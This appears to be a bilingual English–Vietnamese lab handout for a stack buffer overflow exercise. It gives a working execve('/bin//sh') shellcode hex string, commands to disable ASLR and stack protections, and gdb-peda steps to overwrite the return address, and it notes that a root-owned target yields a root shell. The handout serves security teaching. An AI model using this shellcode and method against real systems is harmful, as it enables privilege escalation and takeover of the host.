Tips for code injection lab:
Write shellcode program in assembly language (sh.asm), compile with nasm (sh.o) then link with ld to generate executable file (sh)
(Viết chương trình shellcode bằng hợp ngữ, biên dịch (nasm) và liên kết (ld) để tạo chương trình thực thi)
Run the folowing script to get the hex string of shellcode:
(Chạy bash script dưới đây ở dòng lệnh để tạo chuỗi hex của shellcode:)
$> for i in $(objdump -d shell |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
--> hex string generated: \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80
or run this script to generate shellcode binary file:
(Hoặc chạy bash script dưới đây ở dòng lệnh để sinh binary file mã shellcode nếu inject bằng cách đọc file)
$> for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -ne '\x'$i >> sh.bin; done; 
Estimate buffer size of vulnerable program with input strings of various length (eg. ./vuln.out $(python -c "print('a'*nnn)")
(Ước lượng size từ đỉnh stack đến eip khi biên dịch chương trình với option -fno-stack-protector khi gcc)
Compute the distance between buffer (esp) and return address to determine the padding bytes will be injected along with the sheelcode.
(Tính toán khoảng cách từ buffer đến eip để xác định padding bytes chèn cùng với shellcode)
Prepare for the lab environment:
Turn off OS's address space layout randomization (sudo setctl -w kernel.randomization_va_space)
(Tắt chế độ tạo cấp phát địa chỉ stack ngẫu nhiên khi load chương trình của HĐH)
Compile program with options to defeat stack protecting mechanism and code execution o stack:
(Biên dịch chương trình c với các option tắt cơ chế bảo vệ stack và cho phép thực thi code trên stack)
$> gcc vuln.c -o vuln.out -fno-stack-protector -z execstack
Load vuln.out in gdb 
(Nạp vuln.out trong gdb)
$> gdb vuln.out
Set break point after strcpy instruction
(Đặt điểm dừng chương trình sau lệnh strcpy)
Run program in gdb with injecting argument
(Khởi chạy chương trình trong gdb, chèn chuỗi hex của shellcode trên dòng lệnh)
(gdb-peda)r $(python -c "print(<injecting shellcode along with padding bytes>+'\xff\xff\xff\xff')")
Watch the stack memory from esp (stacktop):
(Quan sát bộ nhớ stack từ esp)
(gdb-peda) x/80xb $esp
Identify the return address while watching out the stack, then replace \xff\xff\xff\xff with value of esp
(Xác định vị trí của địa chỉ trả về trong stack, thay thế \xff\xff\xff\xff với địa chỉ của esp)
set *<address of return address> = <address of esp>
Continue execute program, you should now in the new bash shell:
(Thực thi tiếp chương trình, sẽ thấy xuất hiện dấu nhắc shell --> thực thi được shellcode)
(gdb-peda) continue
$_ <-- you are in the new bash. If vuln.out is set with root as the owner, you will be root in the new shell!  
Type exit to be back in gdb
$exit
(gdb-peda)




